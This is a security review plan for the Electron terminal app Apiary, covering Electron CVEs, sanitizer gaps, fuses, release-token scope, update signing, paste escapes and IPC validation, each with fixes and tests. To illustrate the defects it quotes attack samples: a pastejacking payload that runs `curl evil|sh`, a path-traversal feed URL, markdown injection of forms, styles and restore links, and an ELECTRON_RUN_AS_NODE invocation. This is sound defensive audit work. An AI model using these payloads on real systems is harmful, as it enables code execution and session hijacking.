| [DOC-3](#doc-3-add-a-command-quick-reference-including-how-to-run-a-single-test-per-layer) | Add a command quick-reference, including how to run a single test per layer | Docs/Shared/Structure | high | S | 0 | — |
| [DOC-4](#doc-4-add-how-to-add-x-recipes) | Add "How to add X" recipes | Docs/Shared/Structure | medium | S-M | 1 | SHARED-2 |
| [DOC-5](#doc-5-state-the-definition-of-done-and-the-versioning-changelog-and-commit-rules) | State the definition of done and the versioning, changelog and commit rules | Docs/Shared/Structure | high | S | 0 | — |
| [DOC-6](#doc-6-document-env-vars-cli-flags-and-on-disk-state) | Document env vars, CLI flags and on-disk state | Docs/Shared/Structure | medium | S | 0 | — |
| [DOC-7](#doc-7-add-a-feature-to-path-map) | Add a feature-to-path map | Docs/Shared/Structure | medium | S | 1 | STRUCT-4, STRUCT-5 |
| [DOC-8](#doc-8-index-docssuperpowers-and-move-it-with-test-suite-proposalmd-into-docshistory) | Index docs/superpowers and move it, with test-suite-proposal.md, into docs/history | Docs/Shared/Structure | low | S | 8 | — |
| [DOC-9](#doc-9-add-contributingmd-trim-the-readmes-developer-and-packaging-internals-add-license-and-nvmrc) | Add CONTRIBUTING.md, trim the README's developer and packaging internals, add LICENSE and .nvmrc | Docs/Shared/Structure | medium | S | 8 | DOC-5 |
| [DOC-10](#doc-10-record-the-architecture-decisions-as-adrs-lightly) | Record the architecture decisions as ADRs, lightly | Docs/Shared/Structure | low | M | 8 | DOC-1 |
| [DOC-11](#doc-11-stop-the-docs-drifting-ci-check-that-documented-paths-exist) | Stop the docs drifting (CI check that documented paths exist) | Docs/Shared/Structure | medium | S | 1 | DOC-1 |
| [SHARED-1](#shared-1-split-srcsharedapits-and-typests-by-domain) | Split src/shared/api.ts and types.ts by domain | Docs/Shared/Structure | medium | M | 4 | — |
| [SHARED-2](#shared-2-define-each-cross-process-type-once-in-shared-main-imports-it) | Define each cross-process type once, in shared; main imports it | Docs/Shared/Structure | medium | M | 4 | SHARED-1 |
| [SHARED-3](#shared-3-name-the-magic-strings-shared-by-both-processes-pty-ids-tab-view-theme-prefixes-log-scopes) | Name the magic strings shared by both processes (pty ids, tab view, theme prefixes, log scopes) | Docs/Shared/Structure | medium | S | 4 | SHARED-1 |
| [SHARED-4](#shared-4-make-the-theme-generators-per-effect-and-per-font-notes-exhaustive) | Make the theme generator's per-effect and per-font notes exhaustive | Docs/Shared/Structure | low | S | 0 | — |
| [SHARED-5](#shared-5-enforce-shared-purity-against-node-lint-and-move-the-window-augmentation-out) | Enforce shared purity against Node (lint), and move the Window augmentation out | Docs/Shared/Structure | medium | S | 0 | — |
| [SHARED-6](#shared-6-remove-the-dead-export-and-let-tooling-find-the-rest) | Remove the dead export and let tooling find the rest | Docs/Shared/Structure | low | S | 0 | — |
| [SHARED-7](#shared-7-de-duplicate-the-tab-and-layout-validators-and-test-the-url-validator) | De-duplicate the tab and layout validators, and test the URL validator | Docs/Shared/Structure | low | S | 4 | — |
| [SHARED-8](#shared-8-small-theme-factoring-and-naming-fixes) | Small theme/ factoring and naming fixes | Docs/Shared/Structure | low | S | 4 | SHARED-1 |
| [STRUCT-1](#struct-1-move-test-only-fake-binaries-from-scriptsfixtures-to-testsfixturesbin) | Move test-only fake binaries from scripts/fixtures to tests/fixtures/bin | Docs/Shared/Structure | low | S | 8 | — |
| [STRUCT-2](#struct-2-group-the-flat-top-level-of-srcmain-into-feature-folders) | Group the flat top level of src/main into feature folders | Docs/Shared/Structure | medium | M | 8 | — |
| [STRUCT-3](#struct-3-group-renderer-components-by-feature-and-put-hooks-in-one-place) | Group renderer components by feature, and put hooks in one place | Docs/Shared/Structure | medium | M | 8 | — |
| [STRUCT-4](#struct-4-align-test-file-naming-and-import-style-with-the-modules-under-test) | Align test file naming and import style with the modules under test | Docs/Shared/Structure | low | S-M | 8 | — |
| [STRUCT-5](#struct-5-tidy-gitignore-and-the-eslint-ignore-list) | Tidy .gitignore and the ESLint ignore list | Docs/Shared/Structure | low | S | 0 | — |

## Part A: Security

Scope: whole repo at `/Users/nuwan/projects/pet-projects/apiary` (v1.25.0). Read-only review; `npm run typecheck` passes, `npm audit --omit=dev` reports 0, full `npm audit` reports 28 (4 critical, 15 high), all in devDependencies. Electron itself is one of those devDependencies (see SEC-1).

**The one fact that sets the severity of everything below:** a compromised renderer can already run any command. `ptyWrite` (`src/main/ipc.ts:495`) types into any live pty, and `openShell` (`src/main/appService.ts:686`) starts a login shell for any known session. That follows from the product (it is a terminal app), so keeping script out of the renderer is the control that matters most. Findings that only matter to "a compromised renderer" are rated low. Anything that could lead to renderer compromise, or that reaches the machine without it, is rated higher.

---

### Findings

#### SEC-1: Electron 38 is out of support and has known high-severity CVEs, and `npm audit --omit=dev` hides this

- **Severity:** high
- **Effort:** M
- **Threat:** malicious content inside a transcript JSONL (hostile images and HTML reach Chromium); compromised or hostile renderer
- **Evidence:**
  - `package.json:81` has `"electron": "^38.0.0"` under devDependencies. `npm ls` shows `electron@38.8.6`.
  - `npm audit` (full) reports: `high electron direct Electron: Use-after-free in offscreen child window paint callback | ... fix: electron 44.4.5`, and `high extract-zip ... fix: electron 44.4.5`.
  - `npm audit --omit=dev` reports "found 0 vulnerabilities". It skips Electron because Electron is a devDependency, even though it is the runtime that ships.
  - Transcript images are decoded by Chromium from JSONL data: `src/main/transcript/transcriptReader.ts:110-113` builds `data:${mediaType};base64,${source.data}`, and `MessageRow.tsx:74` renders it as `<img>`. Transcript HTML reaches Blink through `MarkdownText.tsx:25`.
- **What:** Upgrade to a supported Electron major (44.x per the audit fix), and track Electron in any audit that is meant to cover the runtime.
- **Why:** Electron supports only the latest three majors, so 38 no longer receives Chromium or V8 security backports. Content from a hostile transcript reaches Chromium's image decoders and HTML parser. A memory-safety bug there gives native code in the renderer. The renderer can then call the IPC bridge directly, and a compromised renderer can already run commands (see above). So a Chromium renderer bug becomes code execution on the machine.
- **Gain:** Closes the largest route from "hostile transcript" to "code on the machine". It also unblocks SEC-3, whose fuse options track current Electron.
- **Implementation steps:**
  1. `npm i -D electron@^44` and check `better-sqlite3`, `node-pty` and `@xterm/*` still build (`npm start` rebuilds them for Electron).
  2. Read the Electron breaking-changes pages for 39 through 44 and grep for the APIs Apiary uses: `setWindowOpenHandler`, `will-navigate`, `contextBridge`, `ipcRenderer.sendSync`, `shell.openPath`, `app.getGPUFeatureStatus`, `session.flushStorageData`, `webContents.getURL`.
  3. Bump `@playwright/test` if its Electron support needs a newer version.
  4. Add a CI step `npx npm-audit --audit-level=high` (or a short script) that treats the `electron` package as production. For example, run `npm audit --json`, then fail if `vulnerabilities.electron` has severity high or above. This stops the `--omit=dev` blind spot coming back.
- **Verification:** `npm ls electron` shows 44.x. `npm audit --json | jq '.vulnerabilities.electron'` is null. Run the full `npm run test:e2e` and `npm run test:component`. Launch the packaged app and check `process.versions.electron` in the logged `app started` line.
- **Constraints:** The ABI trap in CLAUDE.md: rebuild native modules through `npm start`, `npm test` and `npm run test:e2e`, never by hand. Keep `sandbox: true` and `contextIsolation: true`.

---

#### SEC-2: A transcript can inject forms, `<style>` and same-window navigations; one click on a transcript link reloads the window with an attacker-chosen `?restore=`, which auto-resumes sessions

**Lead review:** Re-verified: the pathname-only comparison (`navigationGuard.ts:34`) and the default DOMPurify config (`MarkdownText.tsx:20`).

- **Severity:** medium
- **Effort:** S
- **Threat:** malicious content inside a transcript JSONL, through markdown rendered by the renderer
- **Evidence:**
  - `src/renderer/components/MarkdownText.tsx:19-20`: `marked.parse(text)` then `DOMPurify.sanitize(rendered)`, using DOMPurify's **default** config. Its default allowlist (read from `node_modules/dompurify/dist/purify.cjs.js`) includes `form`, `input`, `textarea`, `button`, `select`, `dialog`, `style` and `template`, plus the attributes `action`, `method`, `style`, `popover` and `popovertarget`. The CSP allows inline styles: `src/renderer/index.html:5-6` has `style-src 'self' 'unsafe-inline'`. There is no `form-action` or `base-uri` directive, and those two do not fall back to `default-src`.
  - `src/main/navigationGuard.ts:34-35`: `if (from.protocol === 'file:' && to.protocol === 'file:' && from.pathname === to.pathname) return 'allow'`. Only the pathname is compared. `tests/unit/navigationGuard.test.ts:21` explicitly asserts that a navigation to `...&detach=x` is allowed.
  - A markdown link `[docs](?restore={"number":1,"layout":{...},"live":["<uuid>"]})` in a message becomes a relative `href`. DOMPurify keeps relative URLs, and the link resolves to the same `index.html` with a new query, so `will-navigate` allows it.
  - After the reload, `src/renderer/state/uiState.ts:138` parses `restore` from the URL, and `src/renderer/App.tsx:325-331` calls `window.apiary.resume(sessionId)` for every id in `restored.live`. That skips the `checkConflict` step the UI normally runs first.
  - Separately, `<form action="https://x" method="get"><input name=q>...<button>` is sanitised through unchanged. Submitting it triggers a `will-navigate` to `https://x?q=<typed text>`, which `navigationGuard.ts:48-50` hands to `shell.openExternal`.
- **What:**
  1. Restrict DOMPurify to what markdown actually produces.
  2. Only allow a same-app navigation when it is a reload of the exact current URL.
  3. Add `form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'` to the CSP.
- **Why:**
  - A hostile transcript (for example a session that read a malicious page, or an imported JSONL) can restyle the whole window with a global `<style>` or a top-layer `popover`, and draw a convincing fake Apiary dialog. Anything typed into it goes to an external URL on submit.
  - One click on an innocent-looking link replaces the window's layout and spawns `claude --resume` processes for chosen sessions, including ones already running in another terminal. Concurrent resumes then write to the same JSONL.
- **Gain:** Transcript content can only produce text formatting and outbound links, which is all markdown needs.
- **Implementation steps:**
  1. In `MarkdownText.tsx`, call `DOMPurify.sanitize(rendered, { ALLOWED_TAGS: ['p','br','hr','strong','em','del','s','code','pre','blockquote','ul','ol','li','a','h1','h2','h3','h4','h5','h6','table','thead','tbody','tr','th','td','input','span'], ALLOWED_ATTR: ['href','title','align','type','checked','disabled','start','class'], ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i })`. `input` is only for GFM task-list checkboxes. If it is kept, add a `uponSanitizeElement` hook that drops any `input` whose `type` is not `checkbox` and forces `disabled`. Alternatively drop `input` and let task lists render as text.
  2. Add a `DOMPurify.addHook('afterSanitizeAttributes', ...)` (registered once at module scope) that removes an `href` which does not parse as an absolute `http:`, `https:` or `mailto:` URL. This removes relative links such as `?restore=` and `index.html?...`.
  3. In `navigationGuard.ts`, replace the pathname comparison with a full-URL comparison that ignores the hash. Allow only when `stripHash(to.href) === stripHash(from.href)`, which covers reloads. Apply the same rule to the dev-server branch (same origin and same href). Update `tests/unit/navigationGuard.test.ts:21` so a changed query is `'block'`.
  4. In `src/renderer/index.html`, set the CSP to `default-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; form-action 'none'; base-uri 'none'; object-src 'none'; frame-src 'none'`.
- **Verification:**
  - Unit test: `decideNavigation(packaged, packaged + '&restore={}')` returns `'block'`.
  - Component test in `tests/component/transcript.test.tsx`: a message whose text contains `<style>body{display:none}</style>`, `<form action="https://x"><button>go</button></form>`, `[a](?restore=%7B%7D)` and `<div popover>` renders no `style`, `form`, `button` or `[popover]` element, and no `a[href^="?"]`. A normal `[x](https://example.com)` link is still present.
  - Run `npm run test:component` and `npm test`.
- **Constraints:** CLAUDE.md says links go to the system browser. Keep `http`, `https` and `mailto` external. Do not add `'unsafe-inline'` to `script-src`.

---

#### SEC-3: No Electron fuses, and test-only environment hooks stay live in packaged builds (including one that loads any URL with the full preload bridge)

**Lead review:** Put the `app.isPackaged` gate inside MAIN-15's `parseRuntimeEnv` if that lands first. Step 2 (fuses) is easiest together with SEC-1's electron-builder 26 upgrade.

- **Severity:** medium
- **Effort:** S (hooks) + M (fuses, together with the electron-builder upgrade)
- **Threat:** other local processes or users, and macOS privacy-permission (TCC) inheritance. Apiary is a terminal host, so users grant it Documents, Desktop and Full Disk Access, and any code that runs *as* Apiary inherits those grants.
- **Evidence:**
  - `electron-builder.yml` and `build/afterPack.cjs` contain no fuse configuration. `node_modules/app-builder-lib` 25.1.8 has no `electronFuses` support, and `@electron/fuses` is not installed. So `RunAsNode`, `EnableNodeOptionsEnvironmentVariable` and `EnableNodeCliInspectArguments` are all left at their default of on. `ELECTRON_RUN_AS_NODE=1 /Applications/Apiary.app/Contents/MacOS/Apiary -e '...'` therefore runs any script under Apiary's identity.
  - `src/main/index.ts:280-283`: `if (process.env.ELECTRON_RENDERER_URL) { ... win.loadURL(url) }`. There is no `app.isPackaged` check, so a packaged app launched with this variable loads a remote page that gets `window.apiary` (ptyWrite, openShell and the rest). The built `out/main/index.js` still contains the branch.
  - `src/main/index.ts:389-390` (`APIARY_CONFIG_ROOT`, `APIARY_DB_PATH`), `413` (`APIARY_CODE_PATH`, whose value becomes the binary spawned by "Open in VS Code"), `434` (`APIARY_GLAB_PATH`, the binary spawned for MR lookups) and `323` (`APIARY_FAKE_UPDATE`) are all honoured in production. `APIARY_FAKE_UPDATE` silently replaces the real updater with a stub, which disables security updates.
  - `npm audit` also flags `app-builder-lib` (electron-builder 25.1.8): "Uncontrolled search path elements within `AppImage` built by `app-builder-lib`", fixed in electron-builder 26.x. That advisory affects the AppImage Apiary ships.
- **What:**
  1. Ignore every `APIARY_*` test hook and `ELECTRON_RENDERER_URL` when `app.isPackaged`.
  2. Upgrade electron-builder to 26.x and flip the fuses at pack time.
- **Why:** Anything that can set the environment of a launch (`launchctl setenv`, a `.desktop` file, a wrapper script) can make Apiary run its code. With the fuses and the hooks gone, that route closes. This matters more for Apiary than for most apps because of the TCC grants a terminal host accumulates. The disabled-updater hook is also a quiet way to keep a user on a vulnerable version.
- **Gain:** A packaged Apiary only runs its own code, and only from its own bundle.
- **Implementation steps:**
  1. In `src/main/index.ts`, add `const testHooks = !app.isPackaged` and read every `APIARY_*` hook and `ELECTRON_RENDERER_URL` only when it is true. The hooks are `APIARY_CONFIG_ROOT`, `APIARY_DB_PATH`, `APIARY_FAKE_LIVE`, `APIARY_FAKE_UPDATE`, `APIARY_FAKE_UPDATE_MODE`, `APIARY_CODE_PATH`, `APIARY_GLAB_PATH`, `APIARY_DEFAULT_THEME` and `APIARY_HEADLESS`. Leave `APIARY_SAFE_THEME` and `--safe-theme` enabled, since they are user recovery paths. The E2E suite launches `electron .` (`tests/e2e/helpers.ts:284-288`), where `app.isPackaged` is false, so tests are unaffected. `createUpdater` already fakes `packaged: true` for itself.
  2. `npm i -D electron-builder@^26`. In `electron-builder.yml`, add an `electronFuses:` block with `runAsNode: false`, `enableNodeOptionsEnvironmentVariable: false`, `enableNodeCliInspectArguments: false`, `enableCookieEncryption: true`, `onlyLoadAppFromAsar: true` and `enableEmbeddedAsarIntegrityValidation: true`. If the upgrade is deferred, add `@electron/fuses` and call `flipFuses(electronBinaryPath, { version: FuseVersion.V1, resetAdHocDarwinSignature: true, ... })` in `build/afterPack.cjs`. afterPack runs before signing.
  3. Confirm nothing relies on `ELECTRON_RUN_AS_NODE` at runtime. `grep -rn "execPath\|ELECTRON_RUN_AS_NODE\|utilityProcess" src/main` currently finds nothing, and the search worker is a `worker_threads` Worker, which is unaffected.
- **Verification:**
  - `npx @electron/fuses read --app release/mac-arm64/Apiary.app` lists the fuses as disabled.
  - `ELECTRON_RUN_AS_NODE=1 release/.../Apiary -e 'console.log(1)'` starts the app instead of printing 1.
  - `ELECTRON_RENDERER_URL=https://example.com` has no effect on the packaged app.
  - `npm run test:e2e:smoke` still passes.
- **Constraints:** The build is unsigned, so asar integrity is advisory on macOS until a Developer ID exists. Also, `out/main/searchWorker.js` is in `asarUnpack` and is not covered by asar integrity. Keep `--safe-theme` and `APIARY_SAFE_THEME` working.

---

#### SEC-4: The release job gives a `contents: write` token to every install script and third-party action, and that token can replace the update feed

**Lead review:** Implement together with TEST-13 (canonical) and TEST-12 as one `release.yml` restructure.

- **Severity:** medium
- **Effort:** S
- **Threat:** hostile update server (the release is the update server), through a supply-chain compromise
- **Evidence:**
  - `.github/workflows/release.yml:27-28` sets `permissions: contents: write` for the whole job.
  - `:50` is `actions/checkout@v4` with no `persist-credentials: false`, so the token sits in `.git/config` for later steps.
  - `:56` is `npm ci`, which runs every dependency's lifecycle scripts with that token readable. `:62-64` is `npm run lint` with `GITHUB_TOKEN` in the environment.
  - Actions are pinned by mutable tags: `actions/checkout@v4`, `actions/setup-node@v4`, `softprops/action-gh-release@v2` (`:74`).
  - The updater trusts whatever `latest-*.yml` the release carries (see SEC-5). So a token that can edit release assets can push an installer to every existing install.
- **What:** Split the workflow into a build job with read-only permissions and no persisted credentials, which uploads artifacts, and a publish job with `contents: write` that runs no npm code and only attaches the files. Pin actions by commit SHA.
- **Why:** Today any compromised transitive dependency's `postinstall`, or a moved `v2` tag on a third-party action, gets a token that can overwrite `latest-mac.yml` and the `.dmg`. That turns one package compromise into an auto-update to malware.
- **Gain:** The write token is only exposed to about ten lines of pinned, first-party-reviewed steps.
- **Implementation steps:**
  1. Top-level `permissions: contents: read`.
  2. `build` matrix job: `actions/checkout@<sha>` with `persist-credentials: false`, then setup-node, `npm ci`, typecheck, lint (pass `GITHUB_TOKEN` there only as the read-only token it now is), test and dist. Then `actions/upload-artifact@<sha>` with the matrix `artifacts`.
  3. New `publish` job: `needs: build`, `permissions: contents: write`, steps `actions/download-artifact@<sha>` then `softprops/action-gh-release@<sha>` with `fail_on_unmatched_files: true`.
  4. Pin every `uses:` to a full SHA with a `# vX.Y.Z` comment, in `ci.yml` too. Optionally add Dependabot for `github-actions`.
  5. Optionally add `actions/attest-build-provenance` in the publish job.
- **Verification:** `grep -n "uses:" .github/workflows/*.yml` shows only 40-hex SHAs. `grep -n "contents: write" .github/workflows/release.yml` matches only inside the publish job. A dry run on a throwaway tag produces the same six assets (dmg, zip, latest-mac.yml, AppImage, deb, latest-linux.yml).
- **Constraints:** CLAUDE.md requires the release to keep `latest-mac.yml`, `latest-linux.yml` and the mac `zip`. Ask before pushing any tag to test it.

---

#### SEC-5: Update authenticity rests only on a SHA-512 served by the same release as the installer, and the assisted download is opened without Gatekeeper quarantine

- **Severity:** medium
- **Effort:** M
- **Threat:** hostile update server (a compromised GitHub account, token or release). MITM is covered by HTTPS, since `node:https` `get` rejects a redirect to `http:`.
- **Evidence:**
  - `src/main/update/electronUpdaterBackend.ts:138-139`: `const digest = hash.digest('base64'); if (digest !== file.sha512)`. `file.sha512` comes from `latest-*.yml` in the same release (`:105`, `latest.files`).
  - `:126` writes the file with `createWriteStream`, which does not set `com.apple.quarantine`, and `:193` then calls `shell.openPath(path)`. Gatekeeper is never consulted for the downloaded `.dmg`.
  - Linux AppImage uses electron-updater's `auto` path (`capability.ts:118-120`), which also only checks sha512.
  - `src/main/update/macSignature.ts` confirms builds are unsigned, so there is no platform signature to fall back on.
- **What:** Sign the update metadata with an offline Ed25519 key and verify it in the app before trusting any hash in it.
- **Why:** Whoever can write to the GitHub release (see SEC-4) controls both the installer and the hash it is checked against. The check detects corruption, not tampering.
- **Gain:** A release compromise without the offline signing key can no longer push code to installed copies.
- **Implementation steps:**
  1. Generate an Ed25519 key pair offline (`openssl genpkey -algorithm ed25519`). Commit the public key PEM as a constant in `src/main/update/`.
  2. At release time, sign `latest-mac.yml` and `latest-linux.yml` (`openssl pkeyutl -sign -rawin`) and upload `latest-mac.yml.sig` and `latest-linux.yml.sig`. The key stays off CI, or lives in a protected environment secret used only by the publish job from SEC-4.
  3. In `electronUpdaterBackend.ts`, before `downloadInstaller` and before `downloadForInstall`, fetch the `.yml` and its `.sig` over `fetchStream`. Verify with `crypto.verify(null, ymlBytes, publicKey, sig)` and require that the parsed version and sha512 equal `latest`'s. Refuse the update otherwise.
  4. After verifying the `.dmg`, set quarantine so Gatekeeper still sees it: `execFile('xattr', ['-w', 'com.apple.quarantine', '0081;' + hexTime + ';Apiary;', target])`. Alternatively add `LSFileQuarantineEnabled` to the app's Info.plist through `mac.extendInfo`.
- **Verification:**
  - Add unit tests in `tests/unit/electronUpdaterBackend.test.ts`: a tampered yml (sha changed) with a valid-looking sig is rejected, a missing `.sig` is rejected, and a correct pair is accepted.
  - `tests/integration/updateService.test.ts` still drives the state machine through the stub backend.
- **Constraints:** Keep the assisted-versus-auto decision in `capability.ts` and the injected `UpdateBackend` shape, so `APIARY_FAKE_UPDATE` (dev and test only after SEC-3) still works. Releases must keep the `latest-*.yml` files.

---

#### SEC-6: Pasted text can end the bracketed paste early and run as keystrokes, both in the Composer (into Claude) and in terminals

- **Severity:** medium (terminal path confirmed; Composer path needs one measurement, see Verification)
- **Effort:** S
- **Threat:** malicious content the user copies, from a hostile web page or from transcript text shown in Apiary
- **Evidence:**
  - `src/main/appService.ts:1095-1101`: `const normalised = text.replace(/\r\n/g, '\n').replace(/\s+$/, '')`, then `this.pty.write(ptyId, PASTE_START + normalised + PASTE_END)`, then `'\r'`. An `ESC[201~` inside `text` is not removed. Everything after it arrives as typed keys: a `\r` submits, and a leading `!` puts Claude Code into bash mode.
  - `src/renderer/state/terminalPaste.ts:15-18` routes terminal pastes through xterm's `term.paste`. In `@xterm/xterm` 5.5.0 (`lib/xterm.js`) that is `e.replace(/\r?\n/g,"\r")` followed by `"\x1b[200~"+e+"\x1b[201~"`. Nothing strips ESC, so a clipboard containing `\x1b[201~\rcurl evil|sh\r` runs in a bash that has bracketed paste on.
- **What:** Remove the bracketed-paste markers (or all C0 ESC) from pasted text before it is wrapped.
- **Why:** Bracketed paste exists so that pasting cannot execute. Apiary wraps pastes in it but lets the payload close the bracket itself, which is the classic pastejacking bypass. Native terminals such as VTE filter these bytes.
- **Gain:** Pasting behaves as users expect, in both the Composer and the terminals.
- **Implementation steps:**
  1. Add `src/shared/pasteSafe.ts` exporting `stripPasteControls(text)`, which removes `\x1b[200~` and `\x1b[201~` and replaces any other `\x1b` with `␛`.
  2. Use it in `AppService.sendPrompt` before wrapping, and in `pasteText` before `term.paste`.
- **Verification:**
  - Unit test: `stripPasteControls('a\x1b[201~\r!x')` contains no `\x1b`.
  - Integration test in `tests/integration/appService.test.ts`: `sendPrompt(ptyId, 'hi\x1b[201~\r!echo pwned')` writes exactly one `\x1b[201~`.
  - First measure whether a Chromium `<textarea>` keeps U+001B on paste (a `getBoundingClientRect`-style devtools check: paste, then read `value.charCodeAt`). If it does, the Composer path is confirmed exploitable.
- **Constraints:** CLAUDE.md requires multi-line prompts to stay a bracketed paste, and `sendPrompt`'s two waits must be kept.

---

#### SEC-7: Assisted-download filename is decoded from feed data into a path, deleted and written before verification, and re-opened later without re-checking

- **Severity:** low
- **Effort:** S
- **Threat:** hostile update server; other local processes
- **Evidence:**
  - `src/main/update/electronUpdaterBackend.ts:112-113`: `const name = decodeURIComponent(file.url.split('/').pop() ?? ...)` then `const target = join(dir, name)`. A feed `url` of `..%2F..%2FLibrary%2Fx.dmg` escapes `~/Downloads`. `pickInstaller` only requires the name to end in `.dmg` or `_amd64.deb`.
  - `:117` runs `rm(target, { force: true })` before anything is verified, and `:126` writes to `target`, following symlinks.
  - The verified file then sits in `~/Downloads` until the user clicks Open (`openInstaller` at `:193`), with no re-hash.
  - `src/main/update/capability.ts:95-97` hands the user `cp -R /Volumes/Apiary/Apiary.app /Applications/`. If a volume named `Apiary` is already mounted, `hdiutil` mounts the new image at `/Volumes/Apiary 1`, and the command copies from the pre-existing volume.
- **What:** Build the filename from `basename`, reject separators, download to a private temporary file with exclusive create, then move it into Downloads. Re-hash before opening. Mount at an explicit mountpoint in the copy-paste command.
- **Why:** The only integrity check covers the moment of download, not the moment of use. The feed controls a path on disk.
- **Gain:** The file that is opened is provably the file that was verified.
- **Implementation steps:**
  1. `const name = basename(decodeURIComponent(...))`. Throw if `name !== decoded`, or if it contains `/` or `\` or starts with `.`.
  2. Download into `mkdtemp(join(app.getPath('temp'), 'apiary-update-'))` using `createWriteStream(tmp, { flags: 'wx', mode: 0o600 })`. Verify, then `rename` into Downloads (or `copyFile` with `COPYFILE_EXCL` across volumes).
  3. Keep the expected sha512 in `UpdateService` state and re-hash in `openInstaller` before `shell.openPath`.
  4. Change the mac command to `m=$(mktemp -d) && hdiutil attach '<dmg>' -nobrowse -quiet -mountpoint "$m" && cp -R "$m/Apiary.app" /Applications/ && hdiutil detach "$m" -quiet`.
- **Verification:**
  - Unit test in `tests/unit/electronUpdaterBackend.test.ts`: a feed file `url: '..%2Fevil.dmg'` rejects without touching the filesystem.
  - A test that changes the file after download makes `openInstaller` return `failed`.
  - Update the `installInstructions` unit test for the new command.
- **Constraints:** Keep the `.deb` and `.dmg` selection in `pickInstaller` and the `reveal` behaviour on Linux.

---

#### SEC-8: Several IPC handlers trust renderer arguments' types, ranges and ownership; one gets stuck in an endless loop on `NaN`

**Lead review:** Re-verified the `NaN` loop. Land steps 2, 5 and 6 as point fixes in Phase 0. The generic guards and the sender check (steps 1, 3, 4, 7, 8) arrive with MAIN-11's registrar.

- **Severity:** low (a compromised renderer can already run commands; these are robustness and defence-in-depth issues)
- **Effort:** M
- **Threat:** compromised or hostile renderer, and a stale renderer build (the case CLAUDE.md "Settings arriving over IPC" is about)
- **Evidence:**
  - `src/main/ipc.ts:134-135` passes `beforeIndex` straight to `readTranscriptPage`. At `src/main/transcript/transcriptReader.ts:188`, `Math.max(0, Math.min(NaN, n))` is `NaN`, so `windowStart === 0` never holds and `windowMessages.length > limit` never holds with an empty read. The `for(;;)` at `:197` spins forever, opening and closing the file on each pass.
  - `src/main/pty/ptyManager.ts:304-307`: `Math.max(1, cols)` has no upper bound and lets `NaN` through. `screens.resize` then sizes a headless xterm to the requested size in the main process.
  - `src/main/ipc.ts:236-280` (`settingsSet`) stores `autoImportIntervalMinutes` (used as `setTimeout(..., intervalMinutes*60*1000)` at `src/main/index.ts:83`), `updateCheckIntervalHours`, `logRetentionDays`, `logMaxSizeMb`, `terminalPathSegments`, `pluginSettings` and `claudeBin` without type or range checks. `recentSectionHours` is the only clamped field.
  - `src/main/ipc.ts:139-140` (`reportLayout`) stores `report` under `report.number`, which the sender chooses. One window can overwrite another window's record, and those records are auto-resumed at the next launch (`src/main/index.ts:476-490`).
  - `src/main/ipc.ts:131-132` and `src/main/appService.ts:514-519` (`importSessions`) run `resolveProject(path)`, which is `git` with `cwd` set to a renderer-supplied path, then `setAutoImport(info.path)`. This contradicts CLAUDE.md's rule that the renderer never supplies a filesystem path.
  - `src/main/git/mrStatusCache.ts:132` builds `` `projects/${...}/merge_requests/${String(iid)}` `` from renderer `iids` with no `Number.isInteger` check (`ipc.ts:330`).
  - No handler checks `event.senderFrame`. The `handle` wrapper at `ipc.ts:73` is the natural place, but the `ipcMain.on` channels (`ptyWrite`, `ptyResize`, `ptyKill`, `reportTabs`, `logWrite`, `renameTerminalInClaude`) bypass it.
  - By contrast, `src/main/theme/themeIpc.ts:45-78` validates every argument with `typeof`, which is the pattern to copy.
- **What:** Validate every renderer argument at the IPC boundary, derive the window number from the sender, stop taking paths in `importSessions`, and check the sender frame centrally.
- **Why:** Hostile input should give a clear rejection rather than a hung main process or silently persisted nonsense. Keeping the "renderer never supplies a path" rule true everywhere makes it something a reviewer can rely on.
- **Gain:** A main process that cannot be stalled or mis-configured by a bad message. The IPC surface becomes auditable in one file.
- **Implementation steps:**
  1. Add small guards in `src/main/ipc.ts` (or `src/main/ipcGuards.ts`): `str(v, max=4096)`, `int(v, min, max)`, `bool(v)`, `strArr(v, maxLen)`. Apply them in each handler before calling `service`.
  2. `transcript`: accept `beforeIndex` only if `Number.isSafeInteger(x) && x >= 0`, otherwise treat it as undefined. Also add `if (!Number.isFinite(end)) throw` in `readTranscriptPage`.
  3. `ptyResize`: `cols = int(cols, 1, 1000)`, `rows = int(rows, 1, 500)`.
  4. `settingsSet`: clamp `autoImportIntervalMinutes` (null or 1–1440), `updateCheckIntervalHours` (1–168), `logRetentionDays` (1–90), `logMaxSizeMb` (1–500) and `terminalPathSegments` (use `clampSegments`). Require `claudeBin` to be null or an absolute path string of 4096 characters or fewer. Keep only known plugin ids, and only string, number or boolean values, in `pluginSettings`. Missing fields stay "unchanged" as CLAUDE.md requires.
  5. `reportLayout`: overwrite `report.number` with `windowNumberFor(e.sender.id)`, and ignore the call if that is null. Validate it with the existing `isWindowLayoutReport` (already used in `uiState.ts:138`).
  6. `importSessions`: change the API to take project paths that must pass `this.store.getProject(path)` (or `requireFolder`) before `resolveProject`.
  7. `gitlabMrRefStatus`: `iids.filter(Number.isSafeInteger).slice(0, 50)`.
  8. In `handle` and in a matching `on` wrapper, reject the call unless `e.senderFrame?.url` starts with the app's own `file://.../renderer/index.html` (or the dev-server origin when not packaged). Log each rejection, as CLAUDE.md asks for IPC rejections.
- **Verification:**
  - Add an integration test (`tests/integration/appService.test.ts`): `transcript(id, NaN)` resolves to the last page within a timeout.
  - Unit tests for the settings clamps.
  - A test that `importSessions([], ['/tmp/unknown'])` rejects.
  - `npm run typecheck`, `npm test`, `npm run test:component` (the fake bridge must still satisfy the `ApiaryApi` type).
- **Constraints:** A missing field means "unchanged", never `false` (CLAUDE.md "Settings arriving over IPC"). `claudeBin: null` is a real value.

---

#### SEC-9: Git calls that take ref names from the UI have no `--end-of-options` or `--` separator

- **Severity:** low
- **Effort:** S
- **Threat:** hostile git repo or remote (a fetched tag whose short name starts with `-` is a valid ref; only `git tag` and `git branch` refuse to *create* such names), and a compromised renderer
- **Evidence:**
  - `src/main/git/branchOps.ts:91` runs `['checkout', name]`, `:156` runs `['checkout', '-b', localName, '--track', remoteRef]`, `:160` runs `['checkout', '--detach', ref]`, `:165` runs `['checkout', '-b', name, from]` (`from` is unchecked), and `:265` runs `['merge', '--no-edit', ref]`.
  - `assertSafeRefName` (`:84-88`) is applied only to `createBranch`'s `name`.
  - `git checkout <name>` with no `--` also falls back to treating `name` as a pathspec when no such ref exists, which discards local edits to a file of that name.
- **What:** Pass `--end-of-options` before any ref from outside, and a trailing `--` on `checkout` so the argument can only be a ref.
- **Why:** This guarantees that a ref name can never be parsed as an option or a path.
